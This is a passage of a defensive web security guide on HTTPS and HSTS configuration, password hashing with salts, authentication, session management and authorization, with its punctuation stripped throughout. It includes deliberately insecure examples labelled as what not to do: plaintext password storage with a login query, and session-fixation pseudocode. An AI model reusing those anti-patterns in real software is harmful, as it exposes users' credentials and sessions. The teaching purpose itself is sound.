from a trusted CA  It is possible to generate your own certificate to test a HTTPS configuration out  but you will need a certificate signed by a trusted CA before exposing the service to users  For many uses  a free CA is a good starting point  When searching for a CA  you will encounter different levels of certification offered  The most basic  Domain Validation  DV   certifies the owner of the certificate controls a domain  More costly options are Organization Validation  OV  and Extended Validation  EV   which involve the CA doing additional checks to verify the organization requesting the certificate  Although the more advanced options result in a more positive visual indicator of security in the browser  it may not be worth the extra cost for many  Configure Your Server With a certificate in hand  you can begin to configure your server to support HTTPS  At first glance  this may seem like a task worthy of someone who holds a PhD in cryptography  You may want to choose a configuration that supports a wide range of browser versions  but you need to balance that with providing a high level of security and maintaining some level of performance  The cryptographic algorithms and protocol versions supported by a site have a strong impact on the level of communications security it provides  Attacks with impressive sounding names like FREAK and DROWN and POODLE  admittedly  the last one doesn t sound all that formidable  have shown us that supporting dated protocol versions and algorithms presents a risk of browsers being tricked into using the weakest option supported by a server  making attack much easier  Advancements in computing power and our understanding of the mathematics underlying algorithms also renders them less safe over time  How can we balance staying up to date with making sure our website remains compatible for a broad assortment of users who might be using dated browsers that only support older protocol versions and algorithms  Fortunately  there are tools that help make the job of selection a lot easier  Mozilla has a helpful SSL Configuration Generator to generate recommended configurations for various web servers  along with a complementary Server Side TLS Guide with more in depth details  Note that the configuration generator mentioned above enables a browser security feature called HSTS by default  which might cause problems until you re ready to commit to using HTTPS for all communications long term  We ll discuss HSTS a little later in this article  Use HTTPS for Everything It is not uncommon to encounter a website where HTTPS is used to protect only some of the resources it serves  In some cases the protection might only be extended to handling form submissions that are considered sensitive  Other times  it might only be used for resources that are considered sensitive  for example what a user might access after logging into the site  The trouble with this inconsistent approach is that anything that isn t served over HTTPS remains susceptible to the kinds of risks that were outlined earlier  For example  an attacker doing a man in the middle attack could simply alter the form mentioned above to submit sensitive data over plaintext HTTP instead  If the attacker injects executable code that will be executed in the context of our site  it isn t going to matter much that part of it is protected with HTTPS  The only way to prevent those risks is to use HTTPS for everything  The solution isn t quite as clean cut as flipping a switch and serving all resources over HTTPS  Web browsers default to using HTTP when a user enters an address into their address bar without typing  https     explicitly  As a result  simply shutting down the HTTP network port is rarely an option  Websites instead conventionally redirect requests received over HTTP to use HTTPS  which is perhaps not an ideal solution  but often the best one available  For resources that will be accessed by web browsers  adopting a policy of redirecting all HTTP requests to those resources is the first step towards using HTTPS consistently  For example  in Apache redirecting all requests to a path  in the example   content and anything beneath it  can be enabled with a few simple lines    Redirect requests to  content to use HTTPS  mod_rewrite is required  RewriteEngine On RewriteCond   HTTPS     on  NC  RewriteCond   REQUEST_URI    content       RewriteRule   https     SERVER_NAME   REQUEST_URI   R L  If your site also serves APIs over HTTP  moving to using HTTPS can require a more measured approach  Not all API clients are able to handle redirects  In this situation it is advisable to work with consumers of the API to switch to using HTTPS and to plan a cutoff date  then begin responding to HTTP requests with an error after the date is reached  Use HSTS Redirecting users from HTTP to HTTPS presents the same risks as any other request sent over ordinary HTTP  To help address this challenge  modern browsers support a powerful security feature called HSTS  HTTP Strict Transport Security   which allows a website to request that a browser only interact with it over HTTPS  It was first proposed in 2009 in response to Moxie Marlinspike s famous SSL stripping attacks  which demonstrated the dangers of serving content over HTTP  Enabling it is as simple as sending a header in a response  Strict Transport Security  max age 15768000 The above header instructs the browser to only interact with the site using HTTPS for a period of six months  specified in seconds   HSTS is an important feature to enable due to the strict policy it enforces  Once enabled  the browser will automatically convert any insecure HTTP requests to use HTTPS instead  even if a mistake is made or the user explicitly types  http     into their address bar  It also instructs the browser to disallow the user from bypassing the warning it displays if an invalid certificate is encountered when loading the site  In addition to requiring little effort to enable in the browser  enabling HSTS on the server side can require as little as a single line of configuration  For example  in Apache it is enabled by adding a Header directive within the VirtualHost configuration for port 443   VirtualHost   443        HSTS  mod_headers is required   15768000 seconds   6 months  Header always set Strict Transport Security  max age 15768000    VirtualHost  Now that you have an understanding of some of the risks inherent to ordinary HTTP  you might be scratching your head wondering what happens when the first request to a website is made over HTTP before HSTS can be enabled  To address this risk some browsers allow websites to be added to a  HSTS Preload List  that is included with the browsers  Once included in this list it will no longer be possible for the website to be accessed using HTTP  even on the first time a browser is interacting with the site  Before deciding to enable HSTS  some potential challenges must first be considered  Most browsers will refuse to load HTTP content referenced from a HTTPS resource  so it is important to update existing resources and verify all resources can be accessed using HTTPS  We don t always have control over how content can be loaded from external systems  for example from an ad network  This might require us to work with the owner of the external system to adopt HTTPS  or it might even involve temporarily setting up a proxy to serve the external content to our users over HTTPS until the external systems are updated  Once HSTS is enabled  it cannot be disabled until the period specified in the header elapses  It is advisable to make sure HTTPS is working for all content before enabling it for your site  Removing a domain from the HSTS Preload List will take even longer  The decision to add your website to the Preload List is not one that should be taken lightly  Unfortunately  not all browsers in use today support HSTS  It can not yet be counted on as a guaranteed way to enforce a strict policy for all users  so it is important to continue to redirect users from HTTP to HTTPS and employ the other protections mentioned in this article  For details on browser support for HSTS  you can visit Can I use  Protect Cookies Browsers have a built in security feature to help avoid disclosure of a cookie containing sensitive information  Setting the  secure  flag in a cookie will instruct a browser to only send a cookie when using HTTPS  This is an important safeguard to make use of even when HSTS is enabled  Other Risks There are some other risks to be mindful of that can result in accidental disclosure of sensitive information despite using HTTPS  It is dangerous to put sensitive data inside of a URL  Doing so presents a risk if the URL is cached in browser history  not to mention if it is recorded in logs on the server side  In addition  if the resource at the URL contains a link to an external site and the user clicks through  the sensitive data will be disclosed in the Referer header  In addition  sensitive data might still be cached in the client  or by intermediate proxies if the client s browser is configured to use them and allow them to inspect HTTPS traffic  For ordinary users the contents of traffic will not be visible to a proxy  but a practice we ve seen often for enterprises is to install a custom CA on their employees  systems so their threat mitigation and compliance systems can monitor traffic  Consider using headers to disable caching to reduce the risk of leaking data due to caching  For a general list of best practices  the OWASP Transport Protection Layer Cheat Sheet contains some valuable tips  Verify Your Configuration As a last step  you should verify your configuration  There is a helpful online tool for that  too  You can visit SSL Labs  SSL Server Test to perform a deep analysis of your configuration and verify that nothing is misconfigured  Since the tool is updated as new attacks are discovered and protocol updates are made  it is a good idea to run this every few months  In Summary Use HTTPS for everything   Use HSTS to enforce it  You will need a certificate from a trusted certificate authority if you plan to trust normal web browsers  Protect your private key  Use a configuration tool to help adopt a secure HTTPS configuration  Set the  secure  flag in cookies  Be mindful not to leak sensitive data in URLs  Verify your server configuration after enabling HTTPS and every few months thereafter  Hash and Salt Your Users  Passwords When developing applications  you need to do more than protect your assets from attackers  You often need to protect your users from attackers  and even from themselves  Living Dangerously The most obvious way to write password authentication is to store username and password in table and do look ups against it  Don t ever do this     SQL CREATE TABLE application_user   email_address VARCHAR 100  NOT NULL PRIMARY KEY  password VARCHAR 100  NOT NULL     python def login conn  email  password   result   conn cursor   execute   SELECT   FROM application_user WHERE email_address     AND password        email  password   return result fetchone   is not None Does this work  Will it allow valid users in and keep unregistered users out  Yes  But here s why it s a very  very bad idea  The Risks Insecure password storage creates risks from both insiders and outsiders  In the former case  an insider such as an application developer or DBA who can read the above application_user table now has access to the credentials of your entire user base  One often overlooked risk is that your insiders can now impersonate your users within your application  Even if that particular scenario isn t of great concern  storing your users  credentials without appropriate cryptographic protection introduces an entirely new class of attack vectors for your user  completely unrelated to your application  We might hope it s otherwise  but the fact is that users reuse credentials  The first time someone signs up for your site of captioned cat pictures using the same email address and password that they use for their bank login  your seemingly low risk credentials database has become a vehicle for storing financial credentials  If a rogue employee or an external hacker steals your credentials data  they can use them for attempted logins to major bank sites until they find the one person who made the mistake of using their credentials with wackycatcaptions org  and one of your user s accounts is drained of funds and you are  at least in part  responsible  That leaves two choices  either store credentials safely or don t store them at all  I Can Hash Passwordz If you went down the path of creating logins for your site  option two is probably not available to you  so you are probably stuck with option one  So what is involved in safely storing credentials  Firstly  you never want to store the password itself  but rather store a hash of the password  A cryptographic hashing algorithm is a one way transformation from an input to an output from which the original input is  for all practical purposes  impossible to recover  More on that  practical purposes  phrase shortly  For example  your password might be  littlegreenjedi   Applying Argon2 with the salt  12345678   more on salts later  and default command line options  gives you the the hex result 9b83665561e7ddf91b7fd0d4873894bbd5afd4ac58ca397826e11d5fb02082a1   Now you aren t storing the password at all  but rather this hash  In order to validate a user s password  you just apply the same hash algorithm to the password text they send  and  if they match  you know the password is valid  So we re done  right  Well  not exactly  The problem now is that  assuming we don t vary the salt  every user with the password  littlegreenjedi  will have the same hash in our database  Many people just re use their same old password  Lookup tables generated using the most commonly occurring passwords and their variations can be used to efficiently reverse engineer hashed passwords  If an attacker gets hold of your password store  they can simply cross reference a lookup table with your password hashes and are statistically likely to extract a lot of credentials in a pretty short period of time  The trick is to add a bit of unpredictability into the password hashes so they cannot be easily reverse engineered  A salt  when properly generated  can provide just that  A Dash of Salt A salt is some extra data that is added to the password before it is hashed so that two instances of a given password do not have the same hash value  The real benefit here is that it increases the range of possible hashes of a given password beyond the point where it is practical to pre compute them  Suddenly the hash of  littlegreenjedi  can t be predicted anymore  If we use the salt the string  BNY0LGUZWWIZ3BVP  and then hash with Argon2 again  we get 67ddb83d85dc6f91b2e70878f333528d86674ecba1ae1c7aa5a94c7b4c6b2c52   On the other hand  if we use  M3WIBNKBYVSJW4ZJ   we get 64e7d42fb1a19bcf0dc8a3533dd3766ba2d87fd7ab75eb7acb6c737593cef14e   Now  if an attacker gets their hands on the password hash store  it is much more expensive to brute force the passwords  The salt doesn t require any special protection like encryption or obfuscation  It can live alongside the hash  or even encoded with it  as is the case with bcrypt  If your password table or file falls into attacker hands access to the salt won t help them use a lookup table to mount an attack on the collection of hashes  A salt should be globally unique per user  OWASP recommends 32 or 64 bit salt if you can manage it  and NIST requires 128 bit at a minimum  A UUID will certainly work and although probably overkill  it s generally easy to generate  if costly to store  Hashing and salting is a good start  but as we will see below  even this might not be enough  Use A Hash That s Worth Its Salt Sadly  all hashing algorithms are not created equal  SHA 1 and MD5 had been common standards for a long time until the discovery of a low cost collision attack  Luckily there are plenty of alternatives that are low collision  and slow  Yes  slow  A slower algorithm means that a brute force attack is more time consuming and therefore costlier to run  The best widely available algorithms are now considered to be scrypt and bcrypt  Because contemporary SHA algorithms and PBKDF2 are less resistant to attacks where GPUs are used  they are probably not great long term strategies  A side note  technically Argon2  scrypt  bcrypt and PBKDF2 are key derivation functions that use key stretching techniques  but for our purposes  we can think of them as a mechanism for creating a hash  Hash Algorithm Use for passwords  scrypt Yes bcrypt Yes SHA 1 No SHA 2 No MD5 No PBKDF2 No Argon2 watch  see sidebar  About Argon2 In July of 2015  Argon2 was announced as the winner of the Password Hashing Competition  Bindings are available for several languages  Argon2 was designed specifically for the purpose of hashing passwords and is resistant to attacks using GPUs and other specialized hardware  However  it is very new and has not yet been broadly adopted  although signs are good that it will be soon  Pay attention to how this adoption occurs  and when implementations become more widely available  When we feel comfortable recommending adoption  we ll update this evolving publication  In addition to choosing an appropriate algorithm  you want to make sure you have it configured correctly  Key derivation functions have configurable iteration counts  also known as work factor  so that as hardware gets faster  you can increase the time it takes to brute force them  OWASP provides recommendations on functions and configuration in their Password Storage Cheat Sheet  If you want to make your application a bit more future proof  you can add the configuration parameters in the password storage  too  along with the hash and salt  That way  if you decide to increase the work factor  you can do so without breaking existing users or having to do a migration in one shot  By including the name of the algorithm in storage  too  you could even support more than one at the same time allowing you to evolve away from algorithms as they are deprecated in favor of stronger ones  Once More with Hashing Really the only change to the code above is that rather than storing the password in clear text  you are storing the salt  the hash  and the work factor  That means when a user first chooses a password  you will want to generate a salt and hash the password with it  Then  during a login attempt  you will use the salt again to generate a hash to compare with the stored hash  As in  CREATE TABLE application_user   email_address VARCHAR 100  NOT NULL PRIMARY KEY  hash_and_salt VARCHAR 60  NOT NULL   def login conn  email  password   result   conn cursor   execute   SELECT hash_and_salt FROM application_user WHERE email_address        email   user   result fetchone   if user is not None  hashed   user 0  encode  utf 8   return is_hash_match password  hashed  return False def is_hash_match password  hash_and_salt   salt   hash_and_salt 0 29  return hash_and_salt    bcrypt hashpw password  salt  The example above uses the python bcrypt library  which stores the salt and the work factor in the hash for you  If you print out the results of hashpw     you can see them embedded in the string  Not all libraries work this way  Some output a raw hash  without salt and work factor  requiring you to store them in addition to the hash  But the result is the same  you use the salt with a work factor  derive the hash  and make sure it matches the one that was originally generated when the password was first created  Final Tips This might be obvious  but all the advice above is only for situations where you are storing passwords for a service that you control  If you are storing passwords on behalf of the user to access another system  your job is considerably more difficult  Your best bet is to just not do it since you have no choice but to store the password itself  rather than a hash  Ideally the third party will be able to support a much more appropriate mechanism like SAML  OAuth or a similar mechanism for this situation  If not  you need to think through very carefully how you store it  where you store it and who has access to it  It s a very complicated threat model  and hard to get right  Many sites create unreasonable limits on how long your password can be  Even if you hash and salt correctly  if your password length limit is too small  or the allowed character set too narrow  you substantially reduce the number of possible passwords and increase the probability that the password can be brute forced  The goal  in the end  is not length  but entropy  but since you can t effectively enforce how your users generate their passwords  the following would leave in pretty good stead  Minimum 12 alpha numeric and symbolic  1   A long maximum like 100 characters  OWASP recommends capping it at most 160 to avoid susceptibility to denial of service attacks resulting from passing in extremely long passwords  You ll have to decide if that s really a concern for your application  Provide your users with some kind of text recommending that  if at all possible  they  use a password manager randomly generate a long password  and don t reuse the password for another site  Don t prevent the user from pasting passwords into the password field  It makes many password managers unusable If your security requirements are very stringent then you may want to think beyond password strategy and look to mechanisms like two factor authentication so you aren t over reliant on passwords for security  Both NIST and Wikipedia have very detailed explanations of the effects of character length and set limits on entropy  If you are resources constrained  you can get quite specific about the cost of breaking into your systems based on speed of GPU clusters and keyspace  but for most of situations  this level of specificity just isn t necessary to find an appropriate password strategy  In Summary Hash and salt all passwords  Use an algorithm that is recognized as secure and sufficiently slow  Ideally  make your password storage mechanism configurable so it can evolve  Avoid storing passwords for external systems and services  Be careful not to set password size limits that are too small  or character set limits that are too narrow  Authenticate Users Safely If we need to know the identity of our users  for example to control who receives specific content  we need to provide some form of authentication  If we want to retain information about a user between requests once they have authenticated  we will also need to support session management  Despite being well known and supported by many full featured frameworks  these two concerns are implemented incorrectly often enough that they have earned spot  2 in the OWASP Top 10  Authentication is sometimes confused with authorization  Authentication confirms that a user is who they claim to be  For example  when you log into your bank  your bank can verify it is in fact you and not an attacker trying to steal the fortune you amassed selling your captioned cat pictures site  Authorization defines whether a user is allowed to do something  Your bank may use authorization to allow you to see your overdraft limit  but not allow you to change it  Session management ties authentication and authorization together  Session management makes it possible to relate requests made by a particular user  Without session management  users would have to authenticate during each request they sent to a web application  All three elements   authentication  authorization  and session management   apply to both human users and to services  Keeping these three separate in our software reduces complexity and therefore risk  There are many methods of performing authentication  Regardless of which method you choose  it is always wise to try to find an existing  mature framework that provides the capabilities you need  Such frameworks have often been scrutinized over a long period of time and avoid many common mistakes  Helpfully  they often come with other useful features as well  An overarching concern to consider from the start is how to ensure credentials remain private when a client sends them across the network  The easiest  and arguably only  way to achieve this is to follow our earlier advice to use HTTPS for everything  One option is to use the simple challenge response mechanism specified in the HTTP protocol for a client to authenticate to a server  When your browser encounters a 401  Unauthorized  response that includes information about a challenge to access the resource  it will popup a window prompting you to enter your name and password  keeping them in memory for subsequent requests  This mechanism has some weaknesses  the most serious of which being that the only way for a user to logout is by closing their browser  A safer option that allows you to manage the lifecycle of a user s session after authenticating is by simply entering credentials through a web form  This can be as simple as looking up a username in a database table and comparing the hash of a password using an approach we outlined in our earlier section on hashing passwords  For example  using Devise  a popular framework for Ruby on Rails  this can be done by registering a module for password authentication in the model used to represent a User  and instructing the framework to authenticate users before requests are processed by controllers    Register Devise s database_authenticatable module in our User model to   handle password authentication using bcrypt  We can optionally tune the work   factor with the  stretches  option  class User   ActiveRecord  Base devise  database_authenticatable end   Superclass to inherit from in controllers that require authentication class AuthenticatedController   ApplicationController before_action  authenticate_user  end Understand Your Options Although authenticating using a username and a password works well for many systems  it isn t our only option  We can rely on external service providers where users may already have accounts to identify them  We can also authenticate users using a variety of different factors  something you know  such as a password or a PIN  something you have  such as your mobile phone or a key fob  and something you are  such as your fingerprints  Depending on your needs  some of these options may be worth considering  while others are helpful when we want to add an extra layer of protection  One option that offers a convenience for many users is to allow them to log in using their existing account on popular services such as Facebook  Google  and Twitter  using a service called Single Sign On  SSO   SSO allows users to log in to different systems using a single identity managed by an identity provider  For example  when visiting a website you may see a button that says  Sign in with Twitter  as an authentication option  To achieve this  SSO relies on the external service to manage logging the user in and to confirm their identity  The user never provides any credentials to our site  SSO can significantly reduce the amount of time it takes to sign up for a site and eliminates the need for users to remember yet another username and password  However  some users may prefer to keep their use of our site private and not connect it to their identity elsewhere  Others may not have an existing account with the external providers we support  It is always preferable to allow users to register by manually entering their information as well  A single factor of authentication such as a username and password is sometimes not enough to keep users safe  Using other factors of authentication can add an additional layer of security to protect users in the event a password is compromised  With Two Factor Authentication  2FA   a second  different factor of authentication is required to confirm the identity of a user  If something the user knows  such as a username and password  is used as the first factor of authentication  a second factor could be something the user has  such as a secret code generated using software on their mobile phone or by a hardware token  Verifying a secret code sent to a user via SMS text message was once a popular way of doing this  but it is now deprecated due to presenting various risks  Applications like Google Authenticator and a multitude of other products and services can be safer and are relatively easy to implement  although any option will increase complexity of an application and should be considered mainly when applications maintain sensitive data  Reauthenticate For Important Actions Authentication isn t only important when logging in  We can also use it to provide additional protection when users perform sensitive actions such as changing their password or transferring money  This can help limit the exposure in the event a user s account is compromised  For example  some online merchants require you to re enter details from your credit card when making a purchase to a newly added shipping address  It is also helpful to require users to re enter their passwords when updating their personal information  Conceal Whether Users Exist When a user makes a mistake entering their username or password  we might see a website respond with a message like this  The user ID is unknown  Revealing whether a user exists can help an attacker enumerate accounts on our system to mount further attacks against them or  depending on the nature of the site  revealing the user has an account may compromise their privacy  A better  more generic  response might be  Incorrect user ID or password  This advice doesn t just apply when logging in  Users can be enumerated through many other functions of a web application  for example when signing up for an account or resetting their password  It is good to be mindful of this risk and avoid disclosing unnecessary information  One alternative is to send an email with a link to continue their registration or a password reset link to a user after they enter their email address  instead of outputting a message indicating whether the account exists  Preventing Brute Force Attacks An attacker might try to conduct a brute force attack to guess account passwords until they find one that works  With attackers increasingly using large networks of compromised systems referred to as botnets to conduct attacks with  finding an effective solution to protect against this while not impacting service continuity is a challenging task  There are many options we can consider  some of which we ll discuss below  As with most security decisions  each provides benefits but also comes with tradeoffs  A good starting point that will slow an attacker down is to lock users out temporarily after a number of failed login attempts  This can help reduce the risk of an account being compromised  but it can also have the unintended effect of allowing an attacker to cause a denial of service condition by abusing it to lock users out  If the lockout requires an administrator to unlock accounts manually  it can cause a serious disruption to service  In addition  account lockout could be used by an attacker to determine whether accounts exist  Still  this will make things difficult for an attacker and will deter many  Using short lockouts of between 10 to 60 seconds can be an effective deterrent without imposing the same availability risks  Another popular option is to use CAPTCHAs  which attempt to deter automated attacks by presenting a challenge that a human can solve but a computer can not  Oftentimes it seems as though they present challenges that can be solved by neither  These can be part of an effective strategy  but they have become decreasingly effective and face criticisms  Advancements have made it possible for computers to solve challenges with greater accuracy  and it has become inexpensive to hire human labor to solve them  They can also present problems for people with vision and hearing impairments  which is an important consideration if we want our site to be accessible  Layering these options has been used as an effective strategy on sites that see frequent brute force attacks  After two login failures occur for an account  a CAPTCHA might be presented to the user  After several more failures  the account might be locked out temporarily  If that sequence of failures repeats again  it might make sense to lock the account once again  this time sending an email to the account owner requiring them to unlock the account using a secret link  Don t Use Default Or Hard Coded Credentials Shipping software with default credentials that are easy to guess presents a major risk for users and applications alike  It may seem like it is providing a convenience for users  but in reality this couldn t be further from the truth  It is common to see this in embedded systems such as routers and IoT devices  which can immediately become easy targets once connected to networks  Better options might be requiring users to enter unique one time passwords and then forcing the user to change it  or preventing the software from being accessed externally until a password is set  Sometimes hard coded credentials are added to applications for development and debugging purposes  This presents risks for the same reasons and might be forgotten about before the software ships  Worse  it may not be possible for the user to change or disable the credentials  We must never hard code credentials in our software  In Frameworks Most web application frameworks include authentication implementations that support a variety of authentication schemes  and there are many other third party frameworks to choose from as well  As we stated earlier  it is preferable to try to find an existing  mature framework that suits your needs  Below are some examples to get you started  Framework Approaches Java Apache Shiro OACC Spring Spring Security Ruby on Rails Devise ASP NET ASP NET Core authentication Built in Authentication Providers Play play silhouette Node js Passport framework In Summary Use existing authentication frameworks whenever possible instead of creating one yourself  Support authentication methods that make sense for your needs  Limit the ability of an attacker to take control of an account  You can take steps to prevent attacks to identify or compromise accounts  Never use default or hard coded credentials  Protect User Sessions As a stateless protocol HTTP offers no built in mechanism for relating user data across requests  Session management is commonly used for this purpose  both for anonymous users and for users who have authenticated  As we mentioned earlier  session management can apply both to human users and to services  Sessions are an attractive target for attackers  If an attacker can break session management to hijack authenticated sessions  they can effectively bypass authentication entirely  To make matters worse  it is fairly common to see session management implemented in a way that makes it easier for sessions to fall into the wrong hands  So what can we do to get it right  As with authentication  it is preferable to use an existing  mature framework to handle session management for you and tune it for your needs rather than trying to implement it yourself from scratch  To give you some idea of why it is important to use an existing framework so you can focus on using it for your needs  we ll discuss some common problems in session management  which fall into two categories  weaknesses in session identifier generation  and weaknesses in the session lifecycle  Generate Safe Session Identifiers Sessions are typically created by setting a session identifier inside a cookie that will be sent by a user s browser in subsequent requests  The security of these identifiers depend on them being unpredictable  unique  and confidential  If an attacker can obtain a session identifier by guessing it or observing it  they can use it to hijack a user s session  The security of identifiers can be easy to undermine by using predictable values  which is fairly common to see in custom implementations  For example  we might see a cookie of the form  Set Cookie  sessionId NzU4NjUtMTQ2Nzg3NTIyNzA1MjkxMg What happens if an attacker logs in several additional times and observes the following sequence for the sessionId cookie  NzU4ODQtMTQ2Nzg3NTIyOTg0NTE4Ng NzU4OTItMTQ2Nzg3NTIzNTQwODEzOQ An attacker might recognize that the sessionId is base64 encoded and decode it to observe its values  75865 1467875227052912 75884 1467875229845186 75892 1467875235408139 It doesn t take much guesswork to realize the token is comprised of two values  what is most likely a sequence number  and the current time in microseconds  An identifier of this type would take little effort for an attacker to guess and hijack sessions  Although this is a basic example  other generation schemes don t always offer much more in the way of protection  Attackers can make use of freely available statistical analysis tools to improve the chances of guessing more complex tokens  Using predictable inputs such as the current time or a user s IP address to derive a token are not enough for this purpose  So how can we generate a session identifier safely  To greatly reduce the chances of an attacker guessing a token  OWASP s Session Management Cheat Sheet recommends using a session identifier that is a minimum of 128 bits  16 bytes  in length generated using a secure pseudorandom number generator  For example  both Java and Ruby have classes named SecureRandom that obtain pseudorandom numbers from sources such as  dev urandom  Instead of using an identifier that will be used to look up information about a user  some session management implementations put information about the user inside of the cookie itself to eliminate the cost of performing a lookup in a data store  Unless done carefully using cryptographic algorithms to ensure the confidentiality  integrity  and authenticity of the data  this can lead to even more problems  The decision to store any information about a user inside of a cookie is a subject of controversy and should not be taken lightly  As a principle  limit the information sent inside the cookie to what is absolutely necessary  Never store personally identifiable information about the user or secret information  even when you re using encryption  If the information includes things like the user s username or their role and privilege levels  you must protect against the risk of an attacker tampering with the data to bypass authorization or hijack another user s account  If you choose to store this type of information inside of cookies  look for an existing framework that mitigates these risks and has withstood scrutiny by experts  Don t Expose Session Identifiers Using HTTPS will help prevent someone from eavesdropping on network traffic to steal session identifiers  but they are sometimes leaked unintentionally in other ways  In a classic example  an airline customer sends a link to search results on the airline s website to a friend  The link contains a parameter with the customer s session identifier  and the friend is suddenly able to book flights as the customer  Needless to say  exposing the session identifier in the URL is risky  It might get unwittingly sent to a third party like in the above example  exposed in the Referer header if the user clicks a link to an external website  or logged in the site s logs  Cookies are a better choice for this purpose since they don t risk exposure in this way  It is also common to see session identifiers sent in custom HTTP headers and even in body arguments of POST requests  No matter what you choose to do  make sure the session identifier should not be exposed in URLs  logs  referrer  or anywhere they could be accessed by an attacker  Protect Your Cookies When cookies are used for sessions  we should take some simple precautions to make sure they are not unintentionally exposed  There are four attributes that are important to understand for this purpose  Domain  Path  HttpOnly  and Secure  Domain restricts the scope of a cookie to a particular domain and its subdomains  and Path further restricts the scope to a path and its subpaths  Both attributes are set to fairly restrictive values by default when not explicitly set  The default for Domain will only permit a cookie to be sent to the originating domain and its subdomains  and the default for Path will restrict a cookie to the path of the resource where the cookie was set and its subpaths  Setting the Domain to a less restrictive value can be risky  Imagine if we were to set the Domain to martinfowler com when visiting payments martinfowler com to pay for a new book subscription service  This would result in the cookie being sent to martinfowler com and any of its subdomains on subsequent requests  Aside from it potentially being unnecessary to send the cookie to all subdomains  if we don t control every subdomain and their security  for example  are they using HTTPS    it might help an attacker to capture cookies  What would happen if our user visited evil martinfowler com  The Path attribute should also be set as restrictive as possible  If the session identifier is only needed when accessing the  secret  path and its subpaths after logging in at  login  it is a good idea to set it to  secret   The other two attributes  Secure and HttpOnly  control how the cookie is used  The Secure flag indicates that the browser should only send the cookie when using HTTPS  The HttpOnly flag instructs the browser that the cookie should not be accessible through JavaScript or other client side scripts  which helps prevent it being stolen by malicious code  Putting it together  our cookie might look like this  Set Cookie  sessionId  top secret value   path  secret   secure  HttpOnly  domain payments martinfowler com The net effect of the above statement would be a cookie with client script access disabled that is only available to requests to the paths below https   payments martinfowler com secret   By restricting the scope of the cookie  the attack surface becomes much smaller  Managing the Session Lifecycle Properly managing the lifecycle of a session will reduce the risk of it becoming compromised  How you manage sessions depends on your needs  As an example  a bank probably has a very different session lifecycle than our site for captioned cat pictures  We may choose to begin a session during the first request a user makes to our site  or we may decide to wait until the user authenticates  Whatever you choose to do  there is a risk when changing the privilege level of a session  What would happen if an attacker is able to set the session identifier for a user to a less privileged session known to the attacker  for example in a cookie or in a hidden form field  If the attacker is able to trick the user into logging in  they are suddenly in control of a more privileged session  This is an attack called session fixation  There are two things we can do to avoid having our users falling into this trap  First  we should always create a new session when a user authenticates or elevates their privilege level  Second  we should only create session identifiers ourselves and ignore identifiers that aren t valid  We would never want to do this     pseudocode  NEVER DO THIS if   isValid sessionId     session   createSession sessionId     The longer a session is active  the greater the chance an attacker might be able to get their hands on it  To reduce that risk and keep our session table clean  we can impose timeouts on sessions that are left inactive for some amount of time  The duration of time depends on your risk tolerance  On our captioned cat pictures site  it might only be necessary to do this after a month or even longer  A bank  on the other hand  might have a strict policy of timing out sessions after 10 minutes of inactivity as a security precaution  Our users might not be using a computer they exclusively have access to  or they might prefer to not leave their session logged in  Always make sure there is a visible and easy way to log out  When a user does log out  we must instruct the browser to destroy their session cookie by indicating that it expired at a date in the past  For example  based the cookie we set earlier  Set Cookie  sessionId  top secret value   path  secret   secure  HttpOnly  domain payments martinfowler com  expires Thu  01 Jan 1970 00 00 00 GMT One final consideration is providing some way for users to terminate their active sessions in the event they accidentally forgot to logout of a system they don t own or even suspect their account has been compromised  One easy way to deal with this is to terminate all sessions for a user when they change their password  It is also helpful to provide the ability for a user to view a list of their active sessions to help them identify when they are at risk  Verify It There are a lot of different considerations involved in authentication and session management  To make sure we haven t made any mistakes  it is helpful to look at OWASP s ASVS  Application Security Verification Standard   which is an invaluable resource when making sure there are no gaps in requirements or in our implementation  The standard has an entire section on authentication and another on session management  ASVS suggests security based on three levels of needs  1  which will help defend against some basic vulnerabilities  2  which is suitable for an ordinary site that maintains some sensitive data  and 3  which we might see in highly sensitive applications such as for health care or financial services  Most of the security precautions we describe will fit in with level 2  In Frameworks We have outlined only some of the risks that arise in session identifier generation and session lifecycle management  Fortunately  session management is built into most web application frameworks and even some server implementations  providing a number of mature options to use rather than risk implementing it yourself  Framework Approaches Java Tomcat Jetty Apache Shiro OACC Spring Spring Security Ruby on Rails Ruby on Rails Devise ASP NET ASP NET Core authentication Built in Authentication Providers Play play silhouette Node js Passport framework In Summary Use existing session management frameworks instead of creating your own  Keep session identifiers secret  do not use them in URLs or logs  Protect session cookies using attributes to restrict their scope  Create a new session when one doesn t exist or whenever a user changes their privilege level  Never create sessions with ids you haven t created yourself  Make sure users have a way to log out and to terminate their existing sessions  Authorize Actions We discussed how authentication establishes the identity of a user or system  sometimes referred to as a principal or actor   Until that identity is used to assess whether an operation should be permitted or denied  it doesn t provide much value  This process of enforcing what is and is not permitted is authorization  Authorization is generally expressed as permission to take a particular action against a particular resource  where a resource is a page  a file on the files system  a REST resource  or even the entire system  Authorize on the Server Among the most critical mistakes a programmer can make is hiding capabilities rather than explicitly enforcing authorization on the server  For example  it is not sufficient to simply hide the  delete user  button from users that are not administrators  The request coming from the user cannot be trusted  so the server code must perform the authorization of the delete  Further  the client should never pass authorization information to the server  Rather the client should only be allowed to pass temporary identity information  such as session ids  that have been previously generated on the server  and are unguessable  see above for session management practices   Again  the server should not trust anything from the client as far as identity  permissions  or roles  that it cannot explicitly validate  Deny by Default Earlier in this article we talked about the value of positive validation  or whitelisting   The same principle applies with authorization  Your authorization mechanism should always deny actions by default unless they are explicitly allowed  Similarly  if you have some actions that require authorization and others that do not  it is much safer to deny by default and override any actions that don t require a permission  In both cases  providing a safe default limits the damage that can occur if you neglect to specify the permissions for a particular action  Authorize Actions on Resources Generally speaking  you will encounter two different kinds of authorization requirements  global permissions and resource level permissions  You can think of global permission as having an implicit system resource  However  implementation details between a global and resource permissions tend to be different  as demonstrated in the following examples  Because the resource of global permission is implicit  or  if you prefer  non existent  the implementation tends to be straightforward  For example  if I wanted to add a permission check to shutdown my server  I could do the following  public OperationResult shutdown final User callingUser    if  callingUser    null    callingUser hasPermission Permission SHUTDOWN     doShutdown    return SUCCESS    else   return PERMISSION_DENIED      An alternative implementation using Spring Security s declarative capability might look like this   PreAuthorize  hasRole  ROLE_SHUTDOWN     public void shutdown   throws AccessDeniedException   doShutdown      Resource authorization is generally more complex because it validates whether an actor can take a particular action against a particular resource  For example a user should be able to modify their own profile and only their own profile  Again  our system MUST validate that the caller is entitled to take the action on the specific resource being affected  The rules that govern resource authorization are domain specific and can be fairly complicated both to implement and maintain  Existing frameworks may provide assistance  but you will need to make sure the one you use is sufficiently expressive to capture the complexity you require without being too complicated to maintain  An example might look like this  public OperationResult updateProfile 